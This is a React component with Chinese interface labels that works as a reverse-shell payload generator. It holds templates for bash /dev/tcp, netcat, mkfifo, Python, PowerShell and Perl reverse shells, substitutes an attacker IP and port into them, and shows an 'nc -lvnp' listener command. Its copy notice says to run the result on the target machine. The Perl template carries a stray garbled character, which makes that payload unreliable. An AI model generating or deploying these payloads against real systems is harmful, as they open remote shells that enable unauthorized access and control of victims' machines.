import { useState, useMemo } from 'react';
import {
    Stack,
    TextInput,
    Button,
    Paper,
    Select,
    Textarea,
    Group,
    Text,
    Divider,
    NumberInput,
    Badge,
    Code
} from '@mantine/core';
import { IconCopy, IconRefresh, IconTerminal2 } from '@tabler/icons-react';
import { useClipboard } from '@mantine/hooks';
import { showNotification } from '../../utils/notifications';

// 反弹 Shell 模板库
const SHELL_TEMPLATES = [
    {
        value: 'bash',
        label: 'Bash -i',
        os: 'Linux',
        template: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    },
    {
        value: 'bash_read',
        label: 'Bash Readline',
        os: 'Linux',
        template: 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'
    },
    {
        value: 'nc',
        label: 'Netcat (Traditional)',
        os: 'Linux/macOS',
        template: 'nc {ip} {port} -e /bin/bash'
    },
    {
        value: 'nc_openbsd',
        label: 'Netcat (OpenBSD)',
        os: 'Linux/macOS',
        template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
    },
    {
        value: 'python',
        label: 'Python 3',
        os: 'Cross-platform',
        template: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
    },
    {
        value: 'powershell',
        label: 'PowerShell (Base64)',
        os: 'Windows',
        template: '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    },
    {
        value: 'perl',
        label: 'Perl',
        os: 'Linux/macOS',
        template: 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))烈)){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\' '
    }
];

export default function ReverseShellGenerator() {
    const [ip, setIp] = useState('192.168.1.1');
    const [port, setPort] = useState<string | number>(4444);
    const [shellType, setShellType] = useState<string | null>('bash');
    const clipboard = useClipboard();

    const currentShell = useMemo(() =>
            SHELL_TEMPLATES.find(t => t.value === shellType),
        [shellType]);

    const generatedCommand = useMemo(() => {
        if (!currentShell) return '';
        return currentShell.template
            .replace(/{ip}/g, ip)
            .replace(/{port}/g, port.toString());
    }, [ip, port, currentShell]);

    const handleCopy = () => {
        clipboard.copy(generatedCommand);
        showNotification({
            type: 'info',
            title: '复制成功',
            message: '命令已复制到剪贴板，请在目标机器执行。',
        });
    };

    return (
        <Paper p="md" withBorder>
            <Stack>
                <Group justify="space-between">
                    <Group gap="xs">
                        <IconTerminal2 size={24} color="var(--mantine-color-blue-6)" />
                        <Text fw={700} size="lg">反弹 Shell 生成器</Text>
                    </Group>

                    <Badge
                        variant="dot"
                        color="green"
                        size="md"
                        radius="xl"
                        styles={{ root: { textTransform: 'none' } }}
                    >
                        模板库: V1.0
                    </Badge>
                </Group>

                <Divider />

                <Group grow>
                    <TextInput
                        label="LHOST (监听 IP)"
                        placeholder="127.0.0.1"
                        value={ip}
                        onChange={(e) => setIp(e.currentTarget.value)}
                    />
                    <NumberInput
                        label="LPORT (监听端口)"
                        placeholder="4444"
                        value={port}
                        onChange={(val) => setPort(val)}
                    />
                </Group>

                <Select
                    label="选择攻击载荷 (Payload)"
                    placeholder="搜索或选择脚本类型"
                    data={SHELL_TEMPLATES.map(t => ({ value: t.value, label: `${t.label} (${t.os})` }))}
                    value={shellType}
                    onChange={setShellType}
                    searchable
                />

                <Stack gap={5}>
                    <Group justify="space-between">
                        <Text size="sm" fw={500}>生成的命令:</Text>
                        <Badge variant="outline" size="xs">{currentShell?.os}</Badge>
                    </Group>
                    <Textarea
                        readOnly
                        autosize
                        minRows={4}
                        value={generatedCommand}
                        styles={{
                            input: {
                                fontFamily: 'monospace',
                                fontSize: '12px',
                                backgroundColor: 'var(--mantine-color-dark-7)',
                                color: 'var(--mantine-color-green-4)'
                            }
                        }}
                    />
                </Stack>

                <Group justify="space-between" mt="md">
                    <Stack gap={0}>
                        <Text size="xs" c="dimmed">本地监听命令:</Text>
                        <Code color="blue.1">nc -lvnp {port}</Code>
                    </Stack>
                    <Group>
                        <Button
                            variant="subtle"
                            color="gray"
                            leftSection={<IconRefresh size={16} />}
                            onClick={() => { setIp(''); setPort(4444); }}
                        >
                            重置
                        </Button>
                        <Button
                            leftSection={<IconCopy size={16} />}
                            onClick={handleCopy}
                        >
                            复制命令
                        </Button>
                    </Group>
                </Group>
            </Stack>
        </Paper>
    );
}